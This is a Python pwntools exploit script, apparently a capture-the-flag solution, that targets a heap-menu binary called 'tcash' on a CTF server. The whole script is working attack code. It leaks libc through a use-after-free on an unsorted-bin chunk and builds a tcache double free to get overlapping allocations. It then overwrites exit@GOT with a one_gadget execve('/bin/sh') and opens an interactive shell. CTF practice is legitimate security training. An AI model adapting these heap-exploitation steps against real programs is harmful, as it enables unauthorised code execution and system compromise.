#!/usr/bin/env python2

from pwn import *

context.update(arch='amd64', os='linux')

b = ELF('./tcash')
l = ELF('./libc-2.27.so')

r = remote("tcash.ctf.cuctf.io", 9700)

def quit(reason):
    r.sendline("Quit")
    r.sendlineafter("Please state your reason for quitting: ", reason)

def display(index):
    r.sendline("Display Entry")
    r.sendlineafter("Index: ", str(index))

def edit_amnt(index, amnt):
    r.sendline("Edit Amount")
    r.sendlineafter("Index: ", str(index))
    r.sendlineafter("Amount: ", str(amnt))

def edit_desc(index, desc):
    r.sendline("Edit Description")
    r.sendlineafter("Index: ", str(index))
    r.sendlineafter("Description: ", str(desc))

def edit_addr(index, addr):
    r.sendline("Edit Address")
    r.sendlineafter("Index: ", str(index))
    r.sendlineafter("Address: ", str(addr))

def delete(index):
    r.sendline("Delete Entry")
    r.sendlineafter("Index: ", str(index))

def create(index, addr_size, desc_size, amnt_size):
    r.sendline("Create Entry")
    r.sendlineafter("Index: ", str(index))
    r.sendlineafter("Address size: ", str(addr_size))
    r.sendlineafter("Description size: ", str(desc_size))
    r.sendlineafter("Amount size: ", str(amnt_size))

# Unsorted UAF to leak libc
create(0, 0x500, 0x500, 0x500)
delete(0)
display(0)

addr = r.recvline()
desc = r.recvline()
amnt = r.recvline()

libc = u64(addr[len("Address: "):-1].ljust(8, '\x00'))

l.address = libc - 0x3EBCA0
b.address = 0x0000000400000

'''
0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL
'''
one_gadget = l.address + 0x4f322

# Tcache dup
create(1,
8,                  # x = malloc(8);
0,                  # NOP
0)                  # NOP
delete(1)           # free(x);
delete(1)           # free(x);

# Overwrite exit@GOT with one_gadget

## Create overlapping chunks
create(2,
0,                  # NOP
0,                  # NOP
8)                  # y = malloc(8);
edit_amnt(2,
p64(b.got['exit'])) # *y = free_addr;
create(3,
0,                  # NOP
8,                  # z = malloc(8);
8)                  # t = malloc(8);
edit_amnt(3,
p64(one_gadget))    # *t = one_gadget;

quit("#PoppinShellz")

r.interactive()
